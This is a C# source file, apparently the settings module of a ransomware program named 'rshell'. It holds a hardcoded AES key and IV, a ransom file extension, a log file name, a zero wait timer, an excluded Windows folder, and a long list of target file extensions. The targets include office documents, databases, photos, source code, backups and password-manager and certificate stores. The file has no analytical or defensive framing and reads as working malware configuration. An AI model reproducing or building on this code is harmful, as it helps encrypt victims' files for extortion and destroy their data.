using System;
using System.IO;

namespace rshell
{
    internal static class Settings
    {

        // ransom extension
        public const string extension = ".r";

        // logfile name
        public const string logfile = "rshell.log";

        // aes iv
        internal static byte[] iv = new byte[] {
            0xf6, 0x02, 0x55, 0xe1, 0x7b, 0xa5, 0x62, 0x1f,
            0x40, 0x6d, 0xe6, 0xb0, 0xf7, 0x21, 0x87, 0xb7
        };

        // ignored paths
        public static string[] ignoredPaths = new string[] {
            Path.Combine(Utils.GetWindowsDrive(), "Windows")
        };

        // wait time (1200 sec = 20 min)
        public const int wait = 0;

        // targeted extensions
        public static string[] extensions = new[] {
            ".wb2", ".psd", ".p7c", ".p7b", ".p12", ".pfx", ".pem", ".crt", ".cer", ".der", ".pl",
            ".py", ".lua", ".css", ".js", ".asp", ".php", ".incpas", ".asm", ".hpp", ".h", ".cpp",
            ".c", ".7z", ".zip", ".rar", ".drf", ".blend", ".apj", ".3ds", ".dwg", ".sda", ".ps",
            ".pat", ".fxg", ".fhd", ".fh", ".dxb", ".drw", ".design", ".ddrw", ".ddoc", ".dcs",
            ".csl", ".csh", ".cpi", ".cgm", ".cdx", ".cdrw", ".cdr6", ".cdr5", ".cdr4", ".cdr3",
            ".cdr", ".awg", ".ait", ".ai", ".agd1", ".ycbcra", ".x3f", ".stx", ".st8", ".st7", ".st6",
            ".st5", ".st4", ".srw", ".srf", ".sr2", ".sd1", ".sd0", ".rwz", ".rwl", ".rw2", ".raw",
            ".raf", ".ra2", ".ptx", ".pef", ".pcd", ".orf", ".nwb", ".nrw", ".nop", ".nef", ".ndd",
            ".mrw", ".mos", ".mfw", ".mef", ".mdc", ".kdc", ".kc2", ".iiq", ".gry", ".grey", ".gray",
            ".fpx", ".fff", ".exf", ".erf", ".dng", ".dcr", ".dc2", ".crw", ".craw", ".cr2", ".cmt",
            ".cib", ".ce2", ".ce1", ".arw", ".3pr", ".3fr", ".mpg", ".jpeg", ".jpg", ".mdb",
            ".sqlitedb", ".sqlite3", ".sqlite", ".sql", ".sdf", ".sav", ".sas7bdat", ".s3db",
            ".rdb", ".psafe3", ".nyf", ".nx2", ".nx1", ".nsh", ".nsg", ".nsf", ".nsd", ".ns4",
            ".ns3", ".ns2", ".myd", ".kpdx", ".kdbx", ".idx", ".ibz", ".ibd", ".fdb", ".erbsql",
            ".db3", ".dbf", ".db-journal", ".db", ".cls", ".bdb", ".al", ".adb", ".backupdb", ".bik",
            ".backup", ".bak", ".bkp", ".moneywell", ".mmw", ".ibank", ".hbk", ".ffd", ".dgc", ".ddd",
            ".dac", ".cfp", ".cdf", ".bpw", ".bgt", ".acr", ".ac2", ".ab4", ".djvu", ".pdf", ".sxm",
            ".odf", ".std", ".sxd", ".otg", ".sti", ".sxi", ".otp", ".odg", ".odp", ".stc", ".sxc",
            ".ots", ".ods", ".sxg", ".stw", ".sxw", ".odm", ".oth", ".ott", ".odt", ".odb", ".csv",
            ".rtf", ".accdr", ".accdt", ".accde", ".accdb", ".sldm", ".sldx", ".ppsm", ".ppsx", ".ppam",
            ".potm", ".potx", ".pptm", ".pptx", ".pps", ".pot", ".ppt", ".xlw", ".xll", ".xlam", ".xla",
            ".xlsb", ".xltm", ".xltx", ".xlsm", ".xlsx", ".xlm", ".xlt", ".xls", ".xml", ".dotm", ".dotx",
            ".docm", ".docx", ".dot", ".doc", ".txt", ".png"
        };

        // buffer size
        public const int bufferSize = 15360;

        internal static byte[] key = new byte[] {
            0xf3, 0x04, 0x52, 0xe6, 0x4b, 0xa5, 0x62, 0x9f,
            0x40, 0x6d, 0xe6, 0xb0, 0xf3, 0x22, 0x87, 0xb6
        };
    }
}
